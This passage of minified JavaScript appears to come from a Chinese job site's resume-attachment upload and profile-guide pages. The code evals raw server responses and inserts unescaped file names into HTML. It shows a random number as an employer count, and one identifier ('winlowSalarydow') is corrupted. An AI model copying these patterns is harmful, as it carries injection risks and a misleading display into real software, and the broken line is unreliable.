        var e = "image/jpg, image/jpeg, image/png, application/vnd.ms-powerpoint, application/pdf, application/msword, application/vnd.openxmlformats-officedocument.wordprocessingml.document, application/vnd.openxmlformats-officedocument.presentationml.presentation,.doc,.docx,.pdf";
        return e = -1 < UA.indexOf("Windows NT 6.1") ? "*" : e
    },
    showUploadWarningPretreatment: function(i) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpgeek/resume/attachment/checkbox.json",
            dataType: "json",
            success: function(e) {
                if (0 == e.code && e.zpData) {
                    var t, e = e.zpData || {};
                    if (3 <= (e.resumeList || []).length && e.complete)
                        return $.dialog({
                            title: "提示",
                            content: '<p>同时只能有3份附件文件，请前往附件管理删除一份后再上传</p><img src="https://img.bosszhipin.com/static/file/2022/9rghsb8r091671779041862.png" />',
                            wrapClass: "max-resume-dialog",
                            cancelText: "",
                            confirmText: "我知道了",
                            closeText: !0,
                            onConfirm: function(e) {
                                try {
                                    _T.sendEvent("dialog_over")
                                } catch (e) {}
                                e.remove()
                            }
                        }),
                        !0;
                    i.isComplete = e.complete,
                    i.resumeCount = e.resumeCount,
                    e.complete ? window.resumeQueryBar && window.resumeQueryBar.loop() : (t = 3 <= e.resumeCount ? "/web/geek/guide?maxResumeCount=true" : "/web/geek/guide",
                    i.callbackUpload = function() {
                        setTimeout(function() {
                            window.location.href = t
                        }, 500)
                    }
                    ),
                    i.showCvEntry && i.isComplete ? Attachment.showCvUploadDailog(i) : Attachment.showUploadWarning(i)
                } else
                    $.toast({
                        type: "error",
                        content: "服务器异常"
                    })
            },
            error: function() {
                $.toast({
                    type: "error",
                    content: "服务器异常"
                })
            }
        })
    },
    showCvUploadDailog: function(t) {
        $.dialog({
            content: '<dl class="resume-wrap"><dd class="sec-upload"><div class="upload-wrap"><p class="upload-guide">拖拽文件到这里</p><p class="upload-tip">支持DOC、DOCX、PDF、JPG、PNG格式附件</p></div><a href="javascript:;" ka="resume_attach_upload" class="btn btn-primary btn-file">上传附件简历 <input type="file" name="file" ka="user-resume-upload-file" accept="image/jpg, image/jpeg, image/png, application/vnd.ms-powerpoint, application/pdf, application/msword, application/vnd.openxmlformats-officedocument.wordprocessingml.document, application/vnd.openxmlformats-officedocument.presentationml.presentation,.doc,.docx,.pdf"></a></dd><dd class="sec-make"><div class="zhipin-resume-img"></div><a href="https://cv.zhipin.com/resume/html/my-resumes" target="_blank" ka="resume_attach_create" class="btn btn-primary">在线快速制作</a></dd></dl>',
            title: "新增附件简历",
            closeText: !0,
            confirmText: "",
            cancelText: "",
            wrapClass: "upload-resume-dialog",
            onOpen: function(e) {
                e.find(".btn-file").on("click", function() {
                    Attachment.bindUploadEvent($(this), e, t)
                }),
                Attachment.bindUploadEvent(e.find(".upload-wrap"), e, t)
            }
        })
    },
    showUploadWarning: function(t) {
        var e = ""
          , i = "upload-dialog-box"
          , n = "dialog_cancel"
          , a = "";
        (t = $.extend({
            title: "",
            confirmText: "上传附件简历",
            cancelText: "",
            callbackChat: null,
            callbackUpload: null
        }, t)).cancelText && (e = '<button type="button" class="btn btn-outline" ka="' + (n = "先聊聊" == t.cancelText ? "dialog_upload_deliver_chat" : n) + '">' + t.cancelText + "</button>",
        i = "upload-dialog-deliver"),
        t.isComplete || (a = '<p>没有附件简历&nbsp;<a href="/web/geek/guide" ka="nlp_no_resume">&nbsp;在线填写</a></p>'),
        $.dialog({
            content: '<div class="' + i + '"><p>支持DOC、DOCX、PDF、JPG、PNG格式附件</p><p class="red">文件大小不超过8M</p><div class="btns">' + e + '<a href="javascript:;" class="btn btn-file">' + t.confirmText + '<input id="fileupload" type="file" name="file" ka="user-resume-upload-file" title="" accept="' + Attachment.getResumeAccept() + '"></a></div>' + a + "</div>",
            title: t.title,
            closeText: !0,
            confirmText: "",
            cancelText: "",
            wrapClass: "dialog-primary-default",
            onOpen: function(e) {
                e.find(".btn-file").on("click", function() {
                    Attachment.bindUploadEvent($(this), e, t)
                }),
                e.find(".btn-outline").on("click", function() {
                    t && t.callbackChat ? t.callbackChat() : e.remove()
                })
            },
            onClose: function() {
                t && t.callbackClose && t.callbackClose()
            }
        })
    },
    bindUploadEvent: function(el, wrap, params) {
        var fileInfo = {}
          , reg = /(\.|\/)(ppt|pptx|doc|docx|pdf|png|jpg|jpeg)$/i
          , params = params || {};
        Attachment.previewErrorNum = 0,
        el.fileupload({
            method: "POST",
            url: "/wapi/zpupload/resume/uploadFile.json",
            dataType: "text",
            acceptFileTypes: reg,
            maxChunkSize: 8e6,
            formData: {
                token: window.top._PAGE.token ? window.top._PAGE.token.split("|")[0] : ""
            },
            add: function(e, t) {
                if (1 < (t.originalFiles || []).length) {
                    Attachment.fileUploadError("一次只能上传单个文件");
                    try {
                        _T.sendEvent("resume-size-choose-fail")
                    } catch (e) {}
                } else {
                    var i = t.files[0]
                      , n = i.name
                      , a = i.size;
                    if (fileInfo = i,
                    reg.test(n))
                        if (8e6 < a) {
                            Attachment.fileUploadError("上传文件超过8兆，请重新选择");
                            try {
                                _T.sendEvent("user_resume_size_limit")
                            } catch (e) {}
                        } else
                            t.paramName = "file",
                            t.submit(),
                            !1 !== params.isComplete && Attachment.showResumeStatusDialog("added", fileInfo);
                    else {
                        Attachment.fileUploadError("选择的文件无效，请重新选择");
                        try {
                            _T.sendEvent("user_resume_size_notsupport")
                        } catch (e) {}
                    }
                }
            },
            done: function(e, data) {
                var result = data.result;
                if ("string" == typeof result && (result = eval("(" + result + ")")),
                0 == result.code && result.zpData)
                    $.ajax({
                        type: "POST",
                        url: "/wapi/zpgeek/resume/geek/preview/check.json",
                        dataType: "JSON",
                        data: {
                            annexType: 0,
                            encryptUrl: result.zpData.previewUrl
                        },
                        success: function(e) {
                            if (0 == e.code) {
                                if (Attachment.supportType = e.zpData.supportType,
                                !1 === params.isComplete && 1 != Attachment.supportType)
                                    return Attachment.preLoadResumeSilence(el, $.extend(result.zpData, fileInfo), params),
                                    !0;
                                Attachment.preLoadResume($.extend(result.zpData, fileInfo), params)
                            }
                        }
                    });
                else {
                    Attachment.showResumeStatusDialog("fail", fileInfo);
                    try {
                        _T.sendEvent("user_resume_upload_error")
                    } catch (e) {}
                }
            },
            fail: function(e, t) {
                Attachment.showResumeStatusDialog("fail", fileInfo);
                try {
                    _T.sendEvent("user_resume_upload_error")
                } catch (e) {}
            }
        })
    },
    preLoadResumeSilence: function(e, t, i) {
        var n;
        return t.previewUrl && (3 <= i.resumeCount ? i && i.callbackUpload && i.callbackUpload() : ((n = new Image).src = "/wflow/zpgeek/download/preview4geek/" + t.previewUrl,
        n.onload = function() {
            return Attachment.postSaveResume(e, t, i),
            Attachment.consoleSuccessLog(t),
            !0
        }
        ,
        n.onerror = function() {
            return Attachment.previewErrorNum++,
            Attachment.previewErrorNum < 3 && (Attachment.preLoadResume(t, i),
            Attachment.consoleLog(t)),
            !1
        }
        )),
        !1
    },
    watchPdfStatus: function(e, t) {
        Attachment.pdfStatusTimer && clearInterval(Attachment.pdfStatusTimer);
        var i, n = $("#pdfFrameOld").length && $("#pdfFrameOld")[0].contentWindow;
        n && (i = 0,
        Attachment.pdfStatusTimer = setInterval(function() {
            i += 500,
            n.PDFView && n.PDFView.downloadComplete ? (clearInterval(Attachment.pdfStatusTimer),
            Attachment.showResumeStatusDialog("success", e, t),
            Attachment.consoleSuccessLog(e)) : 2e4 <= i && (clearInterval(Attachment.pdfStatusTimer),
            Attachment.showResumeStatusDialog("preview", e, t),
            Attachment.consoleLog(e))
        }, 500))
    },
    preLoadResume: function(e, t, i) {
        e.previewUrl && (1 == Attachment.supportType ? (Attachment.showResumeStatusDialog("previewIng", e, t),
        Attachment.watchPdfStatus(e, t)) : (i && (Attachment.previewErrorNum = 0,
        Attachment.showResumeStatusDialog("previewIng", e, t)),
        (i = new Image).src = "/wflow/zpgeek/download/preview4geek/" + e.previewUrl,
        i.onload = function() {
            Attachment.showResumeStatusDialog("success", e, t),
            Attachment.consoleSuccessLog(e)
        }
        ,
        i.onerror = function() {
            Attachment.previewErrorNum++,
            Attachment.previewErrorNum < 3 ? Attachment.preLoadResume(e, t) : Attachment.showResumeStatusDialog("preview", e, t),
            Attachment.consoleLog(e)
        }
        ))
    },
    showResumeStatusDialog: function(e, t, i) {
        e = Attachment.getResumeTemplate(e, t);
        $.dialog({
            title: "",
            content: e,
            closeText: !0,
            confirmText: "",
            cancelText: "",
            wrapClass: "dialog-layer-full dialog-resume-full",
            lock: !0,
            onOpen: function(e) {
                $("body").css("overflow", "hidden"),
                !1 in window && e.find(".img-box").css("height", window.innerHeight - 92 + "px"),
                $("html").hasClass("ie") && e.find(".resume-wrap").css("height", window.innerHeight - 40 + "px"),
                e.find("#fileupload").on("click", function() {
                    Attachment.bindUploadEvent($(this), null, i)
                }),
                e.find(".btn-sure").on("click", function() {
                    Attachment.postSaveResume($(this), t, i)
                }),
                e.find(".link-refresh ").on("click", function() {
                    Attachment.preLoadResume(t, i, !0)
                })
            },
            onClose: function() {
                $("body").css("overflow", "visible"),
                i && i.callbackClosePreviewDialog && i.callbackClosePreviewDialog()
            }
        })
    },
    getResumeTemplate: function(e, t) {
        var i, n, t = t || {}, a = "", o = "", s = "", r = 1 == Attachment.supportType, c = (t.name && (c = t.name.split(".").length,
        a = t.name.split(".")[c - 1]),
        "/wflow/zpgeek/download/preview4geek/" + t.previewUrl), l = "<img " + ("previewIng" == e ? 'style="display:none;"' : "") + ' src="' + (c = r ? encodeURIComponent(c + "?annexType=1") : c) + '"/>';
        switch (r && (r = navigator.userAgent,
        i = -1 < r.indexOf("compatible") && -1 < r.indexOf("MSIE"),
        n = -1 < r.indexOf("Trident") && -1 < r.indexOf("rv:11.0"),
        r = -1 < r.indexOf("Edge"),
        l = i || n || r ? "<iframe " + ("previewIng" == e ? 'style="display:none;"' : "") + ' id="pdfFrameOld" src="/web/common/pdfjs-old/web/viewer.html?file=' + c + '" frameborder="0" style="display: block;width: 100%;height: 100%;"></iframe>' : "<iframe " + ("previewIng" == e ? 'style="display:none;"' : "") + ' id="pdfFrameOld" src="/web/common/pdfjs/web/viewer.html?file=' + c + '" frameborder="0" style="display: block;width: 100%;height: 100%;"></iframe>'),
        e) {
        case "added":
            o = '<div class="data-tips"><div class="tip-inner"><p><i class="icon-upload-resume"></i></p><p class="gray"><i class="icon-loading-chrysanthemum"></i>正在上传中</p></div></div>',
            s = '<h3 class="title">附件状态</h3>' + (t.name ? "<p>附件名称：" + t.name + "</p>" : "") + '<p class="gray">附件内容只能预览10页，且有一定压缩，但不影响Boss看到内容的质量</p>';
            break;
        case "previewIng":
            o = '<div class="img-box">' + l + '<div class="data-tips"><div class="tip-inner"><p><i class="icon-upload-resume"></i></p><p class="gray"><i class="icon-loading-chrysanthemum"></i>正在预览中</p></div></div></div>',
            s = '<h3 class="title">附件确认</h3>' + (t.name ? "<p>附件名称：" + t.name + "</p>" : "") + (t.size ? "<p>附件大小：" + parseInt(t.size / 1024) + " KB</p>" : "") + (a ? "<p>附件格式：" + a + "</p>" : "") + '<p class="gray">附件内容只能预览10页，且有一定压缩，但不影响Boss看到内容的质量。</p><p class="gray">Boss将你转发给同事时，可能会将附件简历一并转发。</p><div class="btns"><a href="javascript:;" class="btn btn-file btn-outline">重新选择<input id="fileupload" type="file" name="file" ka="user_resume_add_reupload" title="" accept="' + Attachment.getResumeAccept() + '"></a><button type="button" class="btn btn-sure" ka="user_resume_add_sure">确定添加</button></div>';
            break;
        case "success":
            o = '<div class="img-box">' + l + "</div>",
            s = '<h3 class="title">附件确认</h3>' + (t.name ? "<p>附件名称：" + t.name + "</p>" : "") + (t.size ? "<p>附件大小：" + parseInt(t.size / 1024) + " KB</p>" : "") + (a ? "<p>附件格式：" + a + "</p>" : "") + '<p class="gray">附件内容只能预览10页，且有一定压缩，但不影响Boss看到内容的质量。</p><p class="gray">Boss将你转发给同事时，可能会将附件简历一并转发。</p><div class="btns"><a href="javascript:;" class="btn btn-file btn-outline">重新选择<input id="fileupload" type="file" name="file" ka="user_resume_add_reupload" title="" accept="' + Attachment.getResumeAccept() + '"></a><button type="button" class="btn btn-sure" ka="user_resume_add_sure">确定添加</button></div>';
            break;
        case "preview":
            o = '<div class="data-tips"><div class="tip-inner"><p><i class="icon-upload-resume"></i></p><p class="gray">预览失败</p><p class="gray">点击 <a href="javascript:;" class="link-refresh text-blue" ka="user-resume-refresh">刷新</a> 重新预览</p></div></div>',
            s = '<h3 class="title">附件状态</h3><p>附件将在投递后被Boss预览查看，请确认显示正确（预览只展示前10页）</p>' + (t.name ? '<p class="gray">附件名称：' + t.name + "</p>" : "") + '<div class="btns"><a href="javascript:;" class="btn btn-through btn-file">重新选择<input id="fileupload" type="file" name="file" ka="user-resume-upload-fail-reupload" title="" accept="' + Attachment.getResumeAccept() + '"></a></div><p class="gray">支持doc，docx，pdf，jpg，png格式附件，文件大小不超过8M</p>';
            break;
        case "fail":
            o = '<div class="data-tips"><div class="tip-inner"><p><i class="icon-upload-resume"></i></p><p class="gray">上传失败</p><p class="gray">请重新上传，如仍然无法成功，可尝试更改文件格式</p></div></div>',
            s = '<h3 class="title">附件状态</h3><p>附件将在投递后被Boss预览查看，请确认显示正确（预览只展示前10页）</p>' + (t.name ? '<p class="gray">附件名称：' + t.name + "</p>" : "") + '<div class="btns"><a href="javascript:;" class="btn btn-through btn-file">重新选择<input id="fileupload" type="file" name="file" ka="user-resume-upload-fail-reupload" title="" accept="' + Attachment.getResumeAccept() + '"></a></div><p class="gray">支持doc，docx，pdf，jpg，png格式附件，文件大小不超过8M</p>'
        }
        return '<div class="pop-resume-box"><div class="resume-wrap"><h3 class="title">上传附件</h3>' + o + '</div><div class="resume-sider">' + s + "</div></div>"
    },
    fileUploadError: function(e) {
        $.dialog({
            content: '<div class="tip-text">' + e + "</div>",
            title: "提示",
            type: "error",
            closeText: !0,
            confirmText: "确定",
            cancelText: "",
            wrapClass: "",
            onOpen: function(e) {}
        })
    },
    postSaveResume: function(i, e, n) {
        i.hasClass("disabled") || (i && i.addClass("disabled"),
        $.ajax({
            type: "POST",
            url: "/wapi/zpgeek/resume/attachment/save.json?previewUrl=" + e.previewUrl + "&annexType=" + (n.isWorks ? 1 : 0),
            dataType: "JSON",
            data: {},
            success: function(e) {
                var t;
                0 == e.code ? ($.toast({
                    type: "success",
                    content: "上传成功"
                }),
                i && i.closest(".dialog-wrap").remove(),
                n && n.callbackUpload && n.callbackUpload(),
                Attachment.reflushSider(),
                $("body").css("overflow", "visible"),
                t = setInterval(function() {
                    Resume.isShowResumeAnalyzeTools(!1) && clearInterval(t)
                }, 1e3),
                setTimeout(function() {
                    clearInterval(t)
                }, 5e3)) : 0 == e.code && "最多上传三份简历" == e.message || 0 == e.code && "正在保存，稍等片刻" == e.message ? $.toast({
                    type: "error",
                    content: e.message
                }) : $.toast({
                    type: "error",
                    content: "保存失败"
                }),
                i && i.removeClass("disabled")
            },
            error: function() {
                $.toast({
                    type: "error",
                    content: "保存失败，请稍后再试"
                }),
                i && i.removeClass("disabled")
            }
        }))
    },
    consoleLog: function(e) {
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/previewFail.json",
            dataType: "JSON",
            data: {
                previewUrl: e.previewUrl
            },
            success: function(e) {}
        })
    },
    consoleSuccessLog: function(e) {
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/previewSuccess.json",
            dataType: "JSON",
            data: {
                previewUrl: e.previewUrl
            },
            success: function(e) {}
        })
    },
    deleteResume: function(i) {
        var e = i.closest(".annex-list").find("li").length
          , n = i.closest("li").attr("data-id")
          , e = 1 < e ? "确认删除该附件简历吗？已发送给Boss的附件简历不受删除影响。" : "确定删除该附件简历吗？删除后将无法向BOSS投递简历。";
        $.dialog({
            content: '<div class="tip-text">' + e + "</div>",
            title: "温馨提示",
            type: "warning",
            onConfirm: function(e) {
                var t = i.closest("li").index() + 1;
                $.ajax({
                    type: "POST",
                    url: "/wapi/zpgeek/resume/attachment/delete.json",
                    data: {
                        resumeId: n
                    },
                    dataType: "json",
                    success: function(e) {
                        0 == e.code ? ($.toast({
                            content: "删除成功",
                            type: "success"
                        }),
                        Attachment.reflushSider()) : $.toast({
                            content: e.message,
                            type: "error"
                        })
                    }
                });
                try {
                    _T.sendEvent("delete_resume_" + t)
                } catch (e) {}
                e.remove()
            }
        })
    },
    renameResume: function(a, e) {
        var t = a.closest("li").find(".basis").text().replace(/\s/g, "").split(".")
          , i = t.splice(0, t.length - 1)
          , o = t.splice(t.length - 1, 1);
        $.dialog({
            content: '<div class="pop-resume-rename"><p>请输入你确定要修改的简历名称</p><p><input maxlength="30" placeholder="请输入简历名称" value="' + i + '" class="ipt" /></p></div>',
            title: "修改附件简历名称",
            wrapClass: "dialog-primary-default",
            onOpen: function(e) {
                e.find(".ipt").on("keyup", function() {
                    $(this).val().replace(/\s/g, "") ? e.find(".btn-sure").removeClass("btn-disabled") : e.find(".btn-sure").addClass("btn-disabled")
                })
            },
            onConfirm: function(e) {
                var t = a.closest("li").attr("data-id")
                  , i = a.closest("li").index() + 1
                  , n = e.find(".ipt").val().replace(/\s/g, "");
                if (n.length) {
                    30 < n.length ? $.toast({
                        content: "字数不能超过30",
                        type: "warning"
                    }) : ($.ajax({
                        type: "POST",
                        url: "/wapi/zpgeek/resume/attachment/name/update.json",
                        data: {
                            resumeId: t,
                            customName: n + "." + o
                        },
                        dataType: "json",
                        success: function(e) {
                            0 == e.code ? ($.toast({
                                content: "重命名成功",
                                type: "success"
                            }),
                            Attachment.reflushSider()) : $.toast({
                                content: e.resmsg,
                                type: "error"
                            })
                        },
                        error: function() {
                            $.toast({
                                content: "重命名失败，请稍后再试",
                                type: "error"
                            })
                        }
                    }),
                    e.remove());
                    try {
                        _T.sendEvent("rename_resume_" + i)
                    } catch (e) {}
                }
            }
        })
    },
    reflushSider: function() {
        $(".user-center").length && Attachment.getUcenterSider($("#async-sider")),
        $(".position-manage").length && (Attachment.getResumeSider(),
        Attachment.getAttachmentList())
    },
    showUploadDeliver: function(t) {
        $.dialog({
            content: '<div class="upload-dialog-deliver"><p class="gray">支持DOC、DOCX、PDF、JPG、PNG格式附件</p><p>文件大小不超过8M</p><div class="btns"><a href="javascript:;" class="btn btn-file">上传附件简历<input id="fileupload" type="file" name="file" ka="user-resume-upload-file" title="" accept="' + Attachment.getResumeAccept() + '"></a><button type="button" class="btn btn-outline">先聊聊</button></div></div>',
            title: "您还没有上传附件简历",
            confirmText: "",
            cancelText: "",
            wrapClass: "dialog-primary-default",
            onOpen: function(e) {
                e.find(".btn-file").on("click", function() {
                    Attachment.bindUploadEvent($(this), e)
                }),
                e.find(".btn-outline").on("click", function() {
                    t && t.callbackChat && t.callbackChat()
                })
            }
        })
    },
    showResumeSelecter: function(e, t) {
        for (var i = "", n = 0, a = "", o = e.resumeList || [], s = 0; s < o.length; s++)
            a += '<li><div class="side">' + o[s].uploadTime + '<span class="size">' + o[s].resumeSizeDesc + '</span><input type="radio" value="' + (o[s].resumeId || o[s].encryptId) + '" /></div><img src="' + staticPath + "/web/geek/images/icon-" + o[s].suffixName.toLowerCase() + '.png" alt="" />' + (o[s].showName || o[s].customName || o[s].originalName) + "</li>";
        a = '<ul class="resume-list">' + a + "</ul>",
        $.dialog({
            content: a,
            title: "请选择需要投递的附件简历",
            confirmText: "确定",
            cancelText: "",
            wrapClass: "choose-resume-dialog",
            onOpen: function(e) {
                var t = e.find(".btn-sure");
                t.addClass("btn-disabled"),
                e.find(".dialog-container").on("click", ".resume-list li", function() {
                    var e = $(this);
                    e.parent().find("input").prop("checked", !1),
                    e.find("input").prop("checked", !0),
                    t.removeClass("btn-disabled"),
                    i = e.find("input:checked").val(),
                    n = e.index()
                });
                try {
                    _T.sendEvent("show_select_resume_dialog")
                } catch (e) {}
            },
            onConfirm: function(e) {
                if (!e.find(".btn-sure").hasClass("btn-disabled")) {
                    if (t && t.callbackConfirm) {
                        t.callbackConfirm(i);
                        try {
                            _T.sendEvent("select_resume_" + n)
                        } catch (e) {}
                    }
                    e.remove()
                }
            }
        })
    }
}
  , Guide = ($(function() {
    var e = $(".position-manage").length
      , t = $(".user-center").length;
    e && Resume.init(),
    (e || t) && Attachment.init(),
    $(".resume-update-pop .cancel").click(function() {
        $(".resume-update-pop").hide()
    }),
    $(".resume-update-pop .jumpto-update").click(function() {
        location.href = "/web/geek/resume"
    })
}),
{
    init: function() {
        Resume.listenSkills(),
        Resume.selectCompanyInit(),
        Resume.selectCityInit();
        var e = $(".experience-info input[name=position]")
          , e = (e.length && e.val() && e.attr("level2") && Resume.getSkillsData({
            p1: e.val(),
            p2: e.attr("level2")
        }, !1),
        $(".guide .container form").each(function() {
            FormsUI.init($(this)),
            "" != $(this).find(".required").val() ? Validate.init($(this), !1, !0) : Validate.init($(this), !0, !0)
        }),
        $(".position-info .sub-title span:first-of-type").text(this.setBossCount),
        $(".btn-footer .prev").on("click", function() {
            Guide.showPrevForms($(this))
        }),
        $(".guide .change-identity").on("click", function() {
            Guide.changeIdentity()
        }),
        $(".guide .upload-resume-nlp").on("click", function() {
            Guide.uploadResumeNlp()
        }),
        $(".change-identity"))
          , t = $(".upload-resume-nlp");
        $(".base-info").hasClass("hide") ? (e.addClass("hide"),
        t.addClass("hide")) : (e.removeClass("hide"),
        t.removeClass("hide")),
        Guide.$skipExpInfoEl = $(".experience-info .hide"),
        Guide.$workSkillTipsEl = $(".experience-info .work-skill-tips"),
        Guide.$freshGraduateEl = $(".base-info .row-fresh-graduate input[name=freshGraduate]"),
        Guide.$rowSalaryEl = $(".position-info .row-salary"),
        Guide.$rowRowExpectPositionEl = $(".position-info .row-expect-position"),
        Guide.$positionInfoFreshGraduateEl = $(".position-info input[name=freshGraduate]"),
        Guide.$positionNameEl = $(".position-info input[name=positionName]"),
        Guide.$positionEl = $(".position-info input[name=position]"),
        Guide.$expectedJobIdEl = $(".position-info input[name=expectedJobId]"),
        $(".guide .skip").on("click", function() {
            Guide.showNextForms($(this))
        }),
        $(".base-info").find('input[name="startWorkYearCode"]').length && 0 == $(".base-info").find('input[name="startWorkYearCode"]').val() ? Guide.$skipExpInfoEl.removeClass("hide") : Guide.$skipExpInfoEl.addClass("hide"),
        $(".ipt-tagsinput").on("itemAdded", function(i) {
            Guide.$workSkillTipsEl.find("li").each(function(e, t) {
                if (t.innerHTML == i.item)
                    return $(this).addClass("selected"),
                    !0
            })
        }).on("itemRemoved", function(i) {
            Guide.$workSkillTipsEl.find("li").each(function(e, t) {
                if (t.innerHTML == i.item)
                    return $(this).removeClass("selected"),
                    !0
            })
        }),
        $(".serial-area").textarealist(),
        $("body").hasClass("guide") && $(window).on("beforeunload", function() {
            return "内容尚未保存，离一份好工作仅仅差最后一步，确认离开当前页面吗？"
        }),
        $(".guide .workstartpicker-wrap").on("click", "li", function() {
            var e = $(".guide .row-apply-status")
              , t = $(".guide .row-fresh-graduate")
              , i = $(".guide .work-or-practice");
            0 == $(this).data("val") ? (Guide.$rowSalaryEl.show(),
            Guide.$rowSalaryEl.find(".required").prop("disabled", !1),
            Guide.$rowRowExpectPositionEl.show(),
            Guide.$rowRowExpectPositionEl.find(".required").prop("disabled", !1),
            Guide.$positionInfoFreshGraduateEl.val(0),
            Guide.$positionNameEl.val(""),
            Guide.$positionEl.val(""),
            Guide.$expectedJobIdEl.val(normalExpectId || ""),
            isGeekIntern = !1,
            e.hide(),
            t.show().find("input[name=freshGraduate]").prop("disabled", !1),
            i.text("实习")) : $(this).hasClass("month") && (Guide.$rowSalaryEl.show(),
            Guide.$rowSalaryEl.find(".required").prop("disabled", !1),
            Guide.$rowRowExpectPositionEl.show(),
            Guide.$rowRowExpectPositionEl.find(".required").prop("disabled", !1),
            Guide.$positionInfoFreshGraduateEl.val(0),
            Guide.$positionNameEl.val(""),
            Guide.$positionEl.val(""),
            Guide.$expectedJobIdEl.val(normalExpectId || ""),
            isGeekIntern = !1,
            e.show(),
            t.hide().find("label").removeClass("radio-checked").end().find("input[name=freshGraduate]").val("").prop("disabled", !0),
            i.text("工作"))
        }),
        $(".guide .row-fresh-graduate").on("click", "label", function() {
            Guide.$positionNameEl.val(""),
            Guide.$positionEl.val(""),
            2 == $(this).data("val") ? (isGeekIntern = !0,
            Guide.$rowSalaryEl.hide(),
            Guide.$rowSalaryEl.find(".required").prop("disabled", !0),
            Guide.$rowRowExpectPositionEl.hide(),
            Guide.$rowRowExpectPositionEl.find(".required").prop("disabled", !0),
            Guide.$positionInfoFreshGraduateEl.val(2),
            Guide.$expectedJobIdEl.val(internExpectId || "")) : (isGeekIntern = !1,
            Guide.$rowSalaryEl.show(),
            Guide.$rowSalaryEl.find(".required").prop("disabled", !1),
            Guide.$rowRowExpectPositionEl.show(),
            Guide.$rowRowExpectPositionEl.find(".required").prop("disabled", !1),
            Guide.$positionInfoFreshGraduateEl.val(1),
            Guide.$expectedJobIdEl.val(normalExpectId || ""))
        })
    },
    changeIdentity: function() {
        $.dialog({
            content: '<div style="padding:10px 0;">你当前正在进行牛人身份的信息完善，确定要切换到BOSS身份么？</div>',
            title: "操作提示",
            closeText: !0,
            confirmText: "确定",
            cancelText: "取消",
            wrapClass: "dialog-prop-default",
            onConfirm: function(e) {
                $(window).off("beforeunload"),
                $.toast({
                    type: "loading",
                    content: "切换中"
                }),
                $.ajax({
                    type: "POST",
                    url: "/user/identity/switch.json",
                    dataType: "JSON",
                    data: {
                        identity: 1
                    },
                    success: function(e) {
                        $("#toast").remove(),
                        1 == e.rescode ? e.toUrl ? ($.toast({
                            type: "success",
                            content: "切换成功，正在跳转"
                        }),
                        setTimeout(function() {
                            window.location.href = e.toUrl
                        }, 500)) : $.toast({
                            type: "error",
                            content: "切换失败"
                        }) : $.toast({
                            type: "error",
                            content: e.resmsg
                        })
                    },
                    error: function() {
                        $("#toast").remove(),
                        $.toast({
                            type: "error",
                            content: "切换失败"
                        })
                    }
                });
                try {
                    _T.sendEvent("switch_recruit_ok")
                } catch (e) {}
                e.remove()
            },
            onCancel: function(e) {
                try {
                    _T.sendEvent("switch_recruit_cancel")
                } catch (e) {}
                e.remove()
            }
        })
    },
    uploadResumeNlp: function() {
        $.dialog({
            content: "我们将会快速识别该简历并转为电子档，确认后就可以快速进行求职之旅",
            title: "创建一份BOSS直聘简历",
            closeText: !0,
            confirmText: "",
            cancelText: "返回创建简历",
            wrapClass: "dialog-prop-default dialog-resume-nlp",
            onOpen: function(e) {
                e.find(".dialog-footer .btn-sure").html('选择文件<input id="fileupload" type="file" name="file" accept="application/msword, application/pdf, application/vnd.openxmlformats-officedocument.wordprocessingml.document">'),
                e.find(".dialog-container").append('<div class="over-layer"></div>'),
                AnalysisResume.initUploadResume(function(e) {
                    AnalysisResume.saveSilent($("#fileupload").data("resume")).then(function() {
                        $(winlowSalarydow).off("beforeunload"),
                        window.location.href = "/web/geek/guide?cvpk=" + e.data.key
                    }, function() {
                        $(window).off("beforeunload"),
                        window.location.href = "/web/geek/guide?cvpk=" + e.data.key
                    })
                }, function() {
                    e.find(".dialog-container").find(".over-layer").hide()
                }, function() {
                    e.find(".dialog-container").find(".over-layer").show()
                })
            },
            onConfirm: function(e) {}
        })
    },
    __conversion: function(e) {
        try {
            _T.sendEvent(e)
        } catch (e) {}
    },
    setBossCount: function() {
        return Math.round(4e3 * Math.random() + 1e3)
    },
    showPrevForms: function(e) {
        var e = e.closest(".info-box").addClass("hide").prev(".info-box").removeClass("hide")
          , t = $(".change-identity");
        e.hasClass("base-info") ? t.removeClass("hide") : t.addClass("hide")
    },
    showNextForms: function(e) {
        var e = e.closest(".info-box").addClass("hide").next(".info-box").removeClass("hide")
          , t = $(".change-identity");
        e.hasClass("base-info") ? t.removeClass("hide") : t.addClass("hide")
    },
    postData: function(form, isAdd) {
        var formEl = form
          , formWrap = formEl.parents(".info-box")
          , formIndex = formWrap.index()
          , url = formEl.attr("action")
          , btnEl = formEl.find('.btn[type="submit"]')
          , oldText = btnEl.text()
          , ka = "complete-" + formEl.find('button[type="submit"]').attr("ka")
          , subData = formEl.serialize();
        btnEl.addClass("btn-disabled").text("请稍后").css("pointer-events", "none"),
        $("input[name=birthday]").length && $("input[name=birthday]").is(":disabled") && (subData += "&birthday=" + $("input[name=birthday]").val()),
        $(".base-info").find('input[name="startWorkYearCode"]').length && 0 == $(".base-info").find('input[name="startWorkYearCode"]').val() ? Guide.$skipExpInfoEl.removeClass("hide") : Guide.$skipExpInfoEl.addClass("hide"),
        $.ajax({
            type: "POST",
            url: url,
            dataType: "JSON",
            data: subData,
            success: function(result) {
                if ("string" == typeof result && (result = eval("(" + result + ")")),
                result.forceFace && (alert("您的账号当前处于不可使用状态，请登录BOSS直聘手机APP查看详情"),
                window.location.href = "/web/zppassport/logout"),
                1 == result.rescode) {
                    if (Guide.__conversion(ka),
                    result.toUrl)
                        Guide.processSuccess(result.toUrl);
                    else {
                        if (formEl.data("url"))
                            return void Guide.postAnother(formEl);
                        Guide.showNextForms(formWrap)
                    }
                    result.encryptId && (formEl.find('input[name ="id"]').length ? formEl.find('input[name ="id"]') : formEl.find('input[name ="expectedJobId"]')).val(result.encryptId)
                } else
                    Resume.showError(result.resmsg);
                btnEl.removeClass("btn-disabled").text(oldText).css("pointer-events", "auto")
            },
            error: function() {
                Resume.showError(),
                btnEl.removeClass("btn-disabled").text(oldText).css("pointer-events", "auto")
            }
        })
    },
    postAnother: function(form) {
        var formEl = form
          , formWrap = formEl.parents(".info-box")
          , url = formEl.data("url")
          , btnEl = formEl.find('.btn[type="submit"]')
          , oldText = btnEl.text()
          , ka = "complete-" + formEl.find('button[type="submit"]').attr("ka")
          , subData = formEl.serialize();
        btnEl.addClass("btn-disabled").text("请稍后").css("pointer-events", "none"),
